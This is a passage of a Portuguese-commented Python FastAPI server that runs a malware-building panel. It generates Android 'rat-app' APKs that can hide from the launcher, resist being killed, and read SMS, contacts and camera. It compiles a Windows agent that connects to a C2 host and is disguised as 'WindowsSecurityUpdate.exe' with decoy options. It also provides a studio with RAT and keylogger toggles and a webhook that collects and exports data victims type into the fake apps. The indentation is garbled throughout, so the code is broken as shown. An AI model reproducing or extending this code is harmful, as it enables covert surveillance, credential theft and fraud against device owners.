                header, b64data = icon.split(",", 1)
                icon_data = base64.b64decode(b64data)
        
        if icon_data:
            logger.info(f"[BUILD-ICON] Recebido ícone customizado com {len(icon_data)} bytes!")
        else:
            logger.warning(f"[BUILD-ICON] Nenhum ícone customizado foi recebido ou lido (icon={type(icon)})")
        
        # Salva build no banco
        apk_build = APKBuild(
            build_id=build_id,
            owner_id=current_user.id,
            app_name=app_name
        )
        db.add(apk_build)
        db.commit()
        
        logger.info(f"[REG] Build registrado: {build_id} -> usuario {current_user.username}")
        
        # Inicializa status síncrono para evitar 404 em enquetes imediatas do cliente
        build_status[build_id] = {
            "status": "building",
            "progress": 5,
            "message": "Iniciando build em background..."
        }

        # Inicia build em background (não bloqueia!)
        build_executor.submit(
            build_apk_background,
            build_id, app_name, icon_data, current_user.id, current_user.username, webview_url, hide_from_launcher, enable_anti_kill, language, enable_camera, enable_contacts, enable_send_sms, enable_read_sms
        )
        
        # Retorna imediatamente
        return {
            "status": "building",
            "message": f"Build iniciado em background",
            "build_id": build_id,
            "check_status_url": f"/api/build-status/{build_id}"
        }
        
    except Exception as e:
        logger.error(f"[ERRO] Erro ao iniciar build: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/build-status/{build_id}")
async def get_build_status(build_id: str, current_user: Operator = Depends(get_current_user), db: Session = Depends(get_db)):
    """Verifica status do build de APK"""
    if build_id not in build_status:
from models import APKBuild
        apk_b = db.query(APKBuild).filter(APKBuild.build_id == build_id).first()
        if apk_b:
            return {
                "status": "building",
                "progress": 10,
                "message": "Processando build..."
            }
        raise HTTPException(status_code=404, detail="Build não encontrado")
    
    status = build_status[build_id]
    
    # Se concluído, retorna resultado completo
    if status["status"] == "done":
        return {
            "status": "success",
            "progress": 100,
            "message": "APK construído com sucesso!",
            **status["result"]
        }
    elif status["status"] == "error":
        return {
            "status": "error",
            "progress": 0,
            "message": status["message"]
        }
    else:
        return {
            "status": "building",
            "progress": status["progress"],
            "message": status["message"]
        }

@app.get("/api/download-apk/{apk_name}")
async def download_apk(apk_name: str):
    """
    Baixa APK construído com proteção contra Path Traversal
    """
    safe_name = os.path.basename(apk_name)
    server_dir = os.path.dirname(os.path.abspath(__file__))
    downloads_dir = os.path.abspath(os.path.join(server_dir, "downloads"))
    apk_path = os.path.abspath(os.path.join(downloads_dir, safe_name))
    
    if not apk_path.startswith(downloads_dir) or not os.path.exists(apk_path):
        raise HTTPException(status_code=404, detail="APK não encontrado")
    
    return FileResponse(
        apk_path,
        media_type="application/vnd.android.package-archive",
        filename=safe_name
    )


@app.get("/api/downloads")
async def list_downloads():
    """
    Lista todos os APKs disponíveis para download
    """
    server_dir = os.path.dirname(os.path.abspath(__file__))
    downloads_dir = os.path.join(server_dir, "downloads")
    
    if not os.path.exists(downloads_dir):
        return {"downloads": []}
    
    files = []
    for f in os.listdir(downloads_dir):
        if f.endswith(".apk"):
            file_path = os.path.join(downloads_dir, f)
            files.append({
                "name": f,
                "size": os.path.getsize(file_path),
                "modified": os.path.getmtime(file_path),
                "download_url": f"/api/download-apk/{f}"
            })
    
    # Ordena por data de modificação (mais recente primeiro)
    files.sort(key=lambda x: x["modified"], reverse=True)
    
    return {"downloads": files}


@app.get("/downloads")
async def downloads_page():
    """
    Página estática para download de APKs
    """
    server_dir = os.path.dirname(os.path.abspath(__file__))
    html_path = os.path.join(server_dir, "downloads.html")
    
    logger.info(f"[DOWNLOADS] Procurando HTML em: {html_path}")
    logger.info(f"[DOWNLOADS] HTML existe: {os.path.exists(html_path)}")
    
    if os.path.exists(html_path):
        logger.info(f"[DOWNLOADS] Servindo downloads.html")
        return FileResponse(html_path, media_type="text/html")
    
    logger.warning("[DOWNLOADS] downloads.html não encontrado, gerando dinâmico")
    
    # Gera página dinâmica se não existir estática
    downloads_list = await list_downloads()
    html = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Downloads - APKs</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
        h1 { color: #333; }
        .apk-item { background: white; padding: 15px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; justify-content: space-between; align-items: center; }
        .apk-name { font-weight: bold; }
        .apk-size { color: #666; font-size: 0.9em; }
        .apk-date { color: #999; font-size: 0.85em; }
        a { color: #2196F3; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .empty { text-align: center; padding: 40px; color: #999; }
    </style>
</head>
<body>
    <h1>📦 APKs Disponíveis para Download</h1>
    <p>Os APKs gerados pelo sistema aparecem abaixo. Clique em "Baixar" para fazer o download.</p>
"""
    
if downloads_list["downloads"]:
    for apk in downloads_list["downloads"]:
        size_kb = apk["size"] / 1024
        date_str = datetime.datetime.fromtimestamp(apk["modified"]).strftime("%d/%m/%Y %H:%M")
        html += f"""    <div class="apk-item">
        <div>
        <div class="apk-name">{apk["name"]}</div>
        <div class="apk-size">{size_kb:.1f} KB</div>
        <div class="apk-date">Criado em: {date_str}</div>
        </div>
        <a href="{apk["download_url"]}" download>Baixar ⬇️</a>
        </div>
        """
    else:
        html += '    <div class="empty">Nenhum APK disponível no momento.</div>\n'

        html += """</body>
        </html>"""

        return HTMLResponse(html)

class BuildEXEPayload(BaseModel):
    c2_host: Optional[str] = None
    c2_port: Optional[int] = 8000
    use_ssl: Optional[bool] = False
    build_id: Optional[str] = "win-001"
    output_name: Optional[str] = "WindowsSecurityUpdate.exe"
    hide_console: Optional[bool] = True
    decoy_url: Optional[str] = ""
    decoy_message: Optional[str] = ""

@app.post("/api/build-exe")
async def build_windows_exe_endpoint(
    request: Request,
    payload: BuildEXEPayload,
    current_user: Operator = Depends(get_current_user)
):
    """
    Compila o agente Windows (win_agent.py) em um executável standalone (.exe)
    """
    try:
        host = payload.c2_host
        if not host:
            host_header = request.headers.get("host", "127.0.0.1")
            host = host_header.split(":")[0]

        sys.path.append(os.path.join(os.path.dirname(__file__), "windows_agent"))
from windows_agent.builder_exe import build_windows_exe

import re
        raw_output = re.sub(r'[^a-zA-Z0-9_-]', '', (payload.output_name or "WindowsAgent").replace(".exe", ""))
        if not raw_output:
            raw_output = "WindowsAgent"
        output_name = f"{raw_output}.exe"
        
        success, result_path = build_windows_exe(
            c2_host=host,
            c2_port=payload.c2_port or 8000,
            use_ssl=payload.use_ssl or False,
            build_id=payload.build_id or f"win-{current_user.id}",
            output_name=output_name,
            hide_console=payload.hide_console if payload.hide_console is not None else True,
            decoy_url=payload.decoy_url or "",
            decoy_message=payload.decoy_message or ""
        )

        if not success:
            raise HTTPException(status_code=500, detail=f"Erro ao compilar .exe: {result_path}")

download_filename = os.path.basename(result_path)
download_url = f"/api/downloads/{download_filename}"

return {
    "success": True,
    "message": "Executável Windows compilado com sucesso!",
    "download_url": download_url,
    "filename": download_filename
}
except HTTPException:
    raise
except Exception as e:
    logger.error(f"Erro ao compilar EXE Windows: {e}")
    raise HTTPException(status_code=500, detail=str(e))
@app.get("/api/downloads/{filename}")
async def download_generic_file(filename: str):
    """
    Download direto de arquivos gerados (EXE, APK, etc) com proteção contra Path Traversal
    """
    safe_name = os.path.basename(filename)
    server_dir = os.path.dirname(os.path.abspath(__file__))
    downloads_dir = os.path.abspath(os.path.join(server_dir, "downloads"))
    file_path = os.path.abspath(os.path.join(downloads_dir, safe_name))
    
    if not file_path.startswith(downloads_dir) or not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="Arquivo não encontrado")
    
    media_type = "application/x-msdownload" if safe_name.endswith(".exe") else "application/octet-stream"
    return FileResponse(
        file_path,
        media_type=media_type,
        filename=safe_name
    )


@app.get("/api/build-status")
async def get_latest_build_status(current_user: Operator = Depends(get_current_user)):
    """
    Retorna status do último build
    """
import os
    server_dir = os.path.dirname(os.path.abspath(__file__))
    apk_path = os.path.join(server_dir, "web", "rat-app.apk")
    
    if os.path.exists(apk_path):
        stat = os.stat(apk_path)
        return {
            "exists": True,
            "size": stat.st_size,
            "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
            "download_url": "/web/rat-app.apk"
        }
    else:
        return {
            "exists": False
        }

# ==================== LAYOUT PREFERENCES ====================

@app.get("/api/user/layout")
async def get_user_layout(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Retorna as preferências de layout do usuário
    """
    prefs = db.query(UserLayoutPreferences).filter(
        UserLayoutPreferences.user_id == current_user.id
    ).first()
    
    if prefs and prefs.layout_data:
        try:
            return {"layout": json.loads(prefs.layout_data)}
        except:
            return {"layout": None}
    
    return {"layout": None}

@app.post("/api/user/layout")
async def save_user_layout(
    layout_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Salva as preferências de layout do usuário
    """
    try:
        prefs = db.query(UserLayoutPreferences).filter(
            UserLayoutPreferences.user_id == current_user.id
        ).first()
        
        if prefs:
            prefs.layout_data = json.dumps(layout_data)
            prefs.updated_at = utc_now()
        else:
            prefs = UserLayoutPreferences(
                user_id=current_user.id,
                layout_data=json.dumps(layout_data)
            )
            db.add(prefs)
        
        db.commit()
        return {"status": "ok", "message": "Layout salvo com sucesso"}
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Erro ao salvar layout: {str(e)}")

@app.delete("/api/user/layout")
async def reset_user_layout(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Reseta as preferências de layout do usuário para o padrão
    """
    try:
        prefs = db.query(UserLayoutPreferences).filter(
            UserLayoutPreferences.user_id == current_user.id
        ).first()
        
        if prefs:
            db.delete(prefs)
            db.commit()
        
        return {"status": "ok", "message": "Layout resetado para padrão"}
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Erro ao resetar layout: {str(e)}")

# ==================== APK BUILDER VISUAL ====================

from models import APKTemplate, APKVisualBuild

@app.get("/api/apk-templates")
async def get_apk_templates(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Retorna templates de APK do usuário
    """
    templates = db.query(APKTemplate).filter(
        (APKTemplate.owner_id == current_user.id) | (APKTemplate.is_public == True)
    ).all()
    
    result = []
    for t in templates:
        result.append({
            "id": t.id,
            "template_id": t.template_id,
            "name": t.name,
            "description": t.description,
            "app_name": t.app_name,
            "package_name": t.package_name,
            "is_public": t.is_public,
            "is_owner": t.owner_id == current_user.id,
            "created_at": t.created_at.isoformat(),
            "updated_at": t.updated_at.isoformat() if t.updated_at else None
        })
    
    return result

@app.post("/api/apk-templates")
async def create_apk_template(
    template_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Cria novo template de APK visual
    """
import uuid
    
    try:
        template_id = str(uuid.uuid4())[:16]
        
        template = APKTemplate(
            template_id=template_id,
            owner_id=current_user.id,
            name=template_data.get("name", "Novo Template"),
            description=template_data.get("description", ""),
            app_name=template_data.get("appName", "Meu App"),
            package_name=template_data.get("packageName", "com.app.novo"),
            template_data=json.dumps(template_data.get("screens", [])),
            theme_data=json.dumps(template_data.get("theme", {})),
            is_public=template_data.get("is_public", False)
        )
        
        db.add(template)
        db.commit()
        db.refresh(template)
        
        logger.info(f"📦 Template criado: {template.name} (ID: {template_id}) por {current_user.username}")
        
        return {
            "status": "ok",
            "template_id": template_id,
            "message": "Template criado com sucesso"
        }
        
    except Exception as e:
        db.rollback()
        logger.error(f"Erro ao criar template: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/apk-templates/{template_id}")
async def get_apk_template(
    template_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Retorna template específico com todos os dados
    """
    template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
    
    if not template:
        raise HTTPException(status_code=404, detail="Template não encontrado")
    
    # Verifica acesso
    if template.owner_id != current_user.id and not template.is_public:
        raise HTTPException(status_code=403, detail="Acesso negado")
    
    return {
        "id": template.id,
        "template_id": template.template_id,
        "name": template.name,
        "description": template.description,
        "app_name": template.app_name,
        "package_name": template.package_name,
        "screens": json.loads(template.template_data) if template.template_data else [],
        "theme": json.loads(template.theme_data) if template.theme_data else {},
        "is_public": template.is_public,
        "created_at": template.created_at.isoformat(),
        "updated_at": template.updated_at.isoformat() if template.updated_at else None
    }

@app.put("/api/apk-templates/{template_id}")
async def update_apk_template(
    template_id: str,
    template_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Atualiza template existente
    """
    template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
    
    if not template:
        raise HTTPException(status_code=404, detail="Template não encontrado")
    
    if template.owner_id != current_user.id:
        raise HTTPException(status_code=403, detail="Apenas o dono pode editar")
    
    try:
        if "name" in template_data:
            template.name = template_data["name"]
        if "description" in template_data:
            template.description = template_data["description"]
        if "appName" in template_data:
            template.app_name = template_data["appName"]
        if "packageName" in template_data:
            template.package_name = template_data["packageName"]
        if "screens" in template_data:
            template.template_data = json.dumps(template_data["screens"])
        if "theme" in template_data:
            template.theme_data = json.dumps(template_data["theme"])
        if "is_public" in template_data:
            template.is_public = template_data["is_public"]
        
        template.updated_at = utc_now()
        db.commit()
        
        return {"status": "ok", "message": "Template atualizado"}
        
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=str(e))

@app.delete("/api/apk-templates/{template_id}")
async def delete_apk_template(
    template_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Exclui template
    """
    template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
    
    if not template:
        raise HTTPException(status_code=404, detail="Template não encontrado")
    
    if template.owner_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Acesso negado")
    
    db.delete(template)
    db.commit()
    
    return {"status": "ok", "message": "Template excluído"}

# Fila de builds visuais
visual_build_status = {}

def build_visual_apk_background(build_id: str, template_data: dict, owner_id: int, db_session, icon_data: bytes = None, enable_anti_kill: bool = True, language: str = "pt"):
    """
    Constrói APK visual em background baseado no template
    Usa o mesmo sistema de build do APK normal (Gradle)
    """
import os
import json
import tempfile
import shutil
import traceback
from pathlib import Path

try:
    visual_build_status[build_id] = {"status": "building", "progress": 5, "message": "Iniciando..."}

    # Cria diretório temporário
    temp_dir = tempfile.mkdtemp()

    # Extrai dados do template
    screens = template_data.get("screens", [])
    theme = template_data.get("theme", {})
    app_name = template_data.get("appName", "App")
    request_admin = template_data.get("requestAdmin", False)

    visual_build_status[build_id] = {"status": "building", "progress": 10, "message": "Preparando configuração..."}

    # Caminhos do projeto
    server_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.join(server_dir, "..", "android-rat")

    # 1. Salva configuração de telas no assets do Android para o app ler
    visual_build_status[build_id] = {"status": "building", "progress": 15, "message": "Salvando configuração de telas..."}

    assets_dir = os.path.join(project_dir, "app", "src", "main", "assets")
    os.makedirs(assets_dir, exist_ok=True)

    config_path = os.path.join(assets_dir, "visual_config.json")
    with open(config_path, "w", encoding="utf-8") as f:
        json.dump({
            "screens": screens,
            "theme": theme,
            "appName": app_name,
            "build_id": build_id
        }, f, ensure_ascii=False, indent=2)

        logger.info(f"[CONFIG] Configuração visual salva em: {config_path}")

        visual_build_status[build_id] = {"status": "building", "progress": 25, "message": "Processando ícone do aplicativo..."}

        # 2. Processa ícone do aplicativo (usa o fornecido ou gera fallback)
        icon_path = os.path.join(temp_dir, "icon.png")

        if icon_data and len(icon_data) > 100:
            with open(icon_path, "wb") as f:
                f.write(icon_data)
                logger.info(f"[VISUAL-ICON] Usando ícone personalizado recebido ({len(icon_data)} bytes)")
        else:
            primary_color = theme.get("primaryColor", "#FF6600")
            try:
from PIL import Image, ImageDraw
size = 512
img = Image.new('RGBA', (size, size), primary_color)
draw = ImageDraw.Draw(img)
margin = size // 4
draw.ellipse([margin, margin, size - margin, size - margin], fill='white')
img.save(icon_path, 'PNG')
except Exception as e:
    logger.warning(f"[WARN] Erro ao criar ícone: {e}, usando ícone padrão")
    default_icon = os.path.join(project_dir, "app", "src", "main", "res", "mipmap-xxxhdpi", "ic_launcher.png")
    if os.path.exists(default_icon):
        shutil.copy(default_icon, icon_path)
    else:
        icon_path = None

        visual_build_status[build_id] = {"status": "building", "progress": 30, "message": "Iniciando compilação Gradle..."}
        stop_visual_ticker = create_smooth_progress_ticker(visual_build_status, build_id, 30, 88)

        # 3. Usa o APKBuilder existente para compilar
        ngrok_url = gangstar_env.public_ws_url(f"build_id={build_id}")

from apk_builder import APKBuilder
builder = APKBuilder(project_dir, ngrok_url)

# Define caminho de saída
downloads_dir = os.path.join(server_dir, "downloads")
os.makedirs(downloads_dir, exist_ok=True)

final_apk_name = f"{app_name.lower().replace(' ', '-')}-visual.apk"
final_apk = os.path.join(downloads_dir, final_apk_name)

# Compila usando o método build_visual_apk para embedar as telas desenhadas no visual_config.json!
success = builder.build_visual_apk(
    app_name=app_name,
    icon_path=icon_path,
    output_path=final_apk,
    visual_config_json=template_data,
    hide_from_launcher=False,
    enable_anti_kill=enable_anti_kill,
    language=language
)

stop_visual_ticker()

# Remove arquivo de configuração do assets após build
try:
    os.remove(config_path)
except:
    pass

# Limpa temp
shutil.rmtree(temp_dir, ignore_errors=True)

if success:
    visual_build_status[build_id] = {
        "status": "done",
        "progress": 100,
        "message": "APK pronto!",
        "result": {
            "apk_name": final_apk_name,
            "download_url": f"/api/download-apk/{final_apk_name}",
            "build_id": build_id
        }
    }
    logger.info(f"[OK] APK Visual construído com Gradle: {app_name} (build_id: {build_id})")
else:
    visual_build_status[build_id] = {
        "status": "error",
        "progress": 0,
        "message": "Erro na compilação Gradle. Verifique os logs."
    }

except Exception as e:
    logger.error(f"[ERRO] Erro no build visual: {e}")
    traceback.print_exc()
    visual_build_status[build_id] = {"status": "error", "progress": 0, "message": str(e)}

@app.post("/api/build-apk-visual")
async def build_visual_apk(
    template: str = Form(...),
    app_name: str = Form(...),
    icon: Union[UploadFile, str, None] = File(None),
    enable_anti_kill: bool = Form(True),
    language: str = Form("pt"),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Inicia build de APK visual baseado no template
    """
import uuid, base64
    
    try:
        build_id = str(uuid.uuid4())[:8].upper()
        template_data = json.loads(template)
        
        # Se a linguagem foi fornecida dentro do template JSON, prioriza
        if isinstance(template_data, dict) and template_data.get("language"):
            language = template_data.get("language")
        
        logger.info(f"[BUILD-VISUAL] Iniciando build: {app_name} (usuario: {current_user.username}, idioma: {language}, anti_kill: {enable_anti_kill})")
        
        icon_data = None
        if isinstance(icon, UploadFile) and icon.filename:
            raw_data = await icon.read()
            if raw_data and len(raw_data) > 100:
                icon_data = raw_data
        elif isinstance(template_data, dict) and template_data.get("appIcon"):
            app_icon_str = template_data.get("appIcon")
            if app_icon_str and app_icon_str.startswith("data:image"):
                try:
                    header, b64data = app_icon_str.split(",", 1)
                    icon_data = base64.b64decode(b64data)
                except Exception as ex:
                    logger.warning(f"[WARN] Erro ao decodificar base64 appIcon: {ex}")
        
        # Salva build no banco
        visual_build = APKVisualBuild(
            build_id=build_id,
            owner_id=current_user.id,
            app_name=app_name,
            build_data=template,
            status="building"
        )
        db.add(visual_build)
        db.commit()
        
        # Inicia build em background
        build_executor.submit(
            build_visual_apk_background,
            build_id, template_data, current_user.id, None, icon_data, enable_anti_kill, language
        )
        
        return {
            "status": "building",
            "message": "Build visual iniciado",
            "build_id": build_id,
            "check_status_url": f"/api/build-visual-status/{build_id}"
        }
        
    except Exception as e:
        logger.error(f"[ERRO] Erro ao iniciar build visual: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/build-visual-status/{build_id}")
async def get_visual_build_status(
    build_id: str,
    current_user: Operator = Depends(get_current_user)
):
    """
    Retorna status do build visual
    """
    if build_id not in visual_build_status:
        raise HTTPException(status_code=404, detail="Build não encontrado")
    
    status = visual_build_status[build_id]
    
    if status["status"] == "done":
        return {
            "status": "success",
            "progress": 100,
            "message": "APK construído com sucesso!",
            **status.get("result", {})
        }
    elif status["status"] == "error":
        return {
            "status": "error",
            "progress": 0,
            "message": status["message"]
        }
    else:
        return {
            "status": "building",
            "progress": status["progress"],
            "message": status["message"]
        }

# ==================== APK STUDIO - SISTEMA COMPLETO ====================

# Armazenamento de projetos e dados dinâmicos do APK Studio
apk_studio_data: Dict[str, Dict] = {}  # user_id -> {projects, captured_data, etc}

@app.get("/api/apk-studio/projects")
async def get_studio_projects(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Lista todos os projetos do usuário no APK Studio"""
from models import APKStudioProject
    
    try:
        projects = db.query(APKStudioProject).filter(
            APKStudioProject.owner_id == current_user.id
        ).all()
        
        return [{
            "id": p.project_id,
            "name": p.name,
            "appName": p.app_name,
            "projectType": p.project_type,
            "enableRat": p.enable_rat,
            "enablePayment": p.enable_payment,
            "createdAt": p.created_at.isoformat() if p.created_at else None
        } for p in projects]
    except Exception as e:
        # Se tabela não existe, retorna lista vazia
        return []

@app.post("/api/apk-studio/projects")
async def create_studio_project(
    project_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Cria um novo projeto no APK Studio"""
from models import APKStudioProject
import uuid
    
    project_id = str(uuid.uuid4())[:12]
    
    project = APKStudioProject(
        project_id=project_id,
        owner_id=current_user.id,
        name=project_data.get("name", "Novo Projeto"),
        project_type=project_data.get("projectType", "custom"),
        app_name=project_data.get("appName", "Meu App"),
        package_name=project_data.get("packageName", "com.meuapp"),
        screens_data=json.dumps(project_data.get("screens", [])),
        theme_data=json.dumps(project_data.get("theme", {})),
        enable_rat=project_data.get("enableRat", False),
        enable_payment=project_data.get("enablePayment", False),
        enable_keylogger=project_data.get("enableKeylogger", False)
    )
    
    db.add(project)
    db.commit()
    
    return {"id": project_id, "message": "Projeto criado com sucesso"}

@app.put("/api/apk-studio/projects/{project_id}")
async def update_studio_project(
    project_id: str,
    project_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Atualiza um projeto existente"""
from models import APKStudioProject
    
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    project.name = project_data.get("name", project.name)
    project.app_name = project_data.get("appName", project.app_name)
    project.screens_data = json.dumps(project_data.get("screens", []))
    project.theme_data = json.dumps(project_data.get("theme", {}))
    project.enable_rat = project_data.get("enableRat", project.enable_rat)
    project.enable_payment = project_data.get("enablePayment", project.enable_payment)
    
    db.commit()
    
    return {"message": "Projeto atualizado"}

@app.delete("/api/apk-studio/projects/{project_id}")
async def delete_studio_project(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Exclui um projeto"""
from models import APKStudioProject
    
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    db.delete(project)
    db.commit()
    
    return {"message": "Projeto excluído"}

# ========== DADOS DINÂMICOS DO APK STUDIO - BANCO DE DADOS PERSISTENTE ==========

@app.post("/api/apk-studio/webhook/{project_id}")
async def studio_webhook(
    project_id: str,
    request: Request,
    db = Depends(get_db)
):
    """
    Webhook para receber dados dos APKs gerados pelo APK Studio.
    Os apps enviam dados aqui quando o usuário preenche formulários.
    SALVA NO BANCO DE DADOS - 100% PERSISTENTE!
    """
from models import StudioCapturedData, StudioDataField, APKStudioProject
import json

try:
    data = await request.json()
    client_ip = request.client.host if request.client else "unknown"

    # Busca o projeto para pegar o owner_id
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id
    ).first()

    owner_id = project.owner_id if project else 1  # Fallback para admin

    # Salva os dados no banco
    captured = StudioCapturedData(
        project_id=project_id,
        owner_id=owner_id,
        data_json=json.dumps(data, ensure_ascii=False),
        device_ip=client_ip,
        device_info=json.dumps(data.get("_device_info", {}), ensure_ascii=False) if "_device_info" in data else None
    )
    db.add(captured)

    # Atualiza campos dinâmicos detectados
    for field_name in data.keys():
        if field_name.startswith("_"):  # Ignora campos internos
            continue

        existing_field = db.query(StudioDataField).filter(
            StudioDataField.project_id == project_id,
            StudioDataField.field_name == field_name
        ).first()

        if existing_field:
            existing_field.occurrences += 1
            existing_field.last_seen = utc_now()
        else:
            new_field = StudioDataField(
                project_id=project_id,
                field_name=field_name,
                field_type=_detect_field_type(data[field_name]),
                occurrences=1
            )
            db.add(new_field)

            db.commit()

            logger.info(f"[APK-STUDIO] ✅ Dados salvos no BD para projeto {project_id}: {len(data)} campos")

            return {"status": "ok", "message": "Dados salvos com sucesso"}
except Exception as e:
    db.rollback()
    logger.error(f"[APK-STUDIO] ❌ Erro no webhook: {e}")
import traceback
traceback.print_exc()
return {"status": "error", "message": str(e)}

def _detect_field_type(value) -> str:
    """Detecta o tipo de um campo baseado no valor"""
    if value is None:
        return "text"
    if isinstance(value, bool):
        return "boolean"
    if isinstance(value, int):
        return "number"
    if isinstance(value, float):
        return "decimal"
    if isinstance(value, str):
        if "@" in value and "." in value:
            return "email"
        if value.isdigit() and len(value) >= 10:
            return "phone"
        if len(value) > 100:
            return "textarea"
        return "text"

@app.get("/api/apk-studio/data/{project_id}")
async def get_studio_data(
    project_id: str,
    page: int = 1,
    limit: int = 50,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """
    Retorna todos os dados recebidos de um projeto - COM PAGINAÇÃO
    Dados vêm do BANCO DE DADOS - 100% persistente!
    """
from models import StudioCapturedData, StudioDataField
import json

# Total de registros
total = db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).count()

# Busca dados com paginação
offset = (page - 1) * limit
captured_data = db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).order_by(StudioCapturedData.created_at.desc()).offset(offset).limit(limit).all()

# Converte para lista de dicts
data_list = []
for item in captured_data:
    try:
        row = json.loads(item.data_json)
        row["_id"] = item.id
        row["_received_at"] = item.created_at.isoformat() if item.created_at else None
        row["_ip"] = esconder_ip(item.device_ip)
        data_list.append(row)
    except:
        pass

    # Busca campos detectados
    fields = db.query(StudioDataField).filter(
        StudioDataField.project_id == project_id
    ).order_by(StudioDataField.occurrences.desc()).all()

    field_list = [{
        "name": f.field_name,
        "type": f.field_type,
        "occurrences": f.occurrences
    } for f in fields]

    return {
        "project_id": project_id,
        "total_entries": total,
        "page": page,
        "limit": limit,
        "total_pages": (total + limit - 1) // limit,
        "fields": field_list,
        "data": data_list
    }

@app.delete("/api/apk-studio/data/{project_id}")
async def clear_studio_data(
    project_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Limpa os dados capturados do projeto"""
from models import StudioCapturedData, StudioDataField, APKStudioProject

project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

db.query(StudioCapturedData).filter(StudioCapturedData.project_id == project_id).delete()
db.query(StudioDataField).filter(StudioDataField.project_id == project_id).delete()
db.commit()

return {"message": "Dados limpos com sucesso"}
    """Limpa TODOS os dados de um projeto do banco de dados"""
from models import StudioCapturedData, StudioDataField
    
    # Exclui dados capturados
    db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).delete()
    
    # Exclui campos detectados
    db.query(StudioDataField).filter(
        StudioDataField.project_id == project_id
    ).delete()
    
    db.commit()
    
    return {"message": "Todos os dados foram excluídos do banco de dados"}

@app.get("/api/apk-studio/data/{project_id}/export")
async def export_studio_data(
    project_id: str,
    format: str = "json",
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Exporta TODOS os dados de um projeto (JSON ou CSV)"""
from models import StudioCapturedData
    
    captured_data = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).order_by(StudioCapturedData.created_at.desc()).all()
    
    data_list = []
    for item in captured_data:
        try:
            row = json.loads(item.data_json)
            row["_id"] = item.id
            row["_received_at"] = item.created_at.isoformat() if item.created_at else None
            row["_ip"] = esconder_ip(item.device_ip)
            data_list.append(row)
        except:
            pass
    
    if format == "csv":
        # Gera CSV
        if not data_list:
            return {"error": "Nenhum dado para exportar"}
        
import csv
import io
        
        output = io.StringIO()
        all_fields = set()
        for row in data_list:
            all_fields.update(row.keys())
        
        writer = csv.DictWriter(output, fieldnames=sorted(all_fields))
        writer.writeheader()
        writer.writerows(data_list)
        
        return StreamingResponse(
            iter([output.getvalue()]),
            media_type="text/csv",
            headers={"Content-Disposition": f"attachment; filename=dados-{project_id}.csv"}
        )
    
    return {
        "project_id": project_id,
        "total": len(data_list),
        "data": data_list
    }

# ========== BUILD DE APK DO APK STUDIO ==========

studio_build_status: Dict[str, Dict] = {}

def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
    """Build de APK do APK Studio em background"""
import time
import subprocess
import shutil
import tempfile
from pathlib import Path

# 🔥 IMPORTANTE: Salva o build no banco para atribuição automática de dispositivos
try:
from models import APKBuild
from database import SessionLocal
db_session = SessionLocal()
try:
    apk_build = APKBuild(
        build_id=build_id,
        owner_id=owner_id,
        app_name=project.get("appName", "APK Studio App")
    )
    db_session.add(apk_build)
    db_session.commit()
    logger.info(f"[APK-STUDIO] Build {build_id} registrado no banco para usuário {owner_id}")
finally:
    db_session.close()
except Exception as e:
    logger.error(f"[APK-STUDIO] Erro ao registrar build no banco: {e}")

    try:
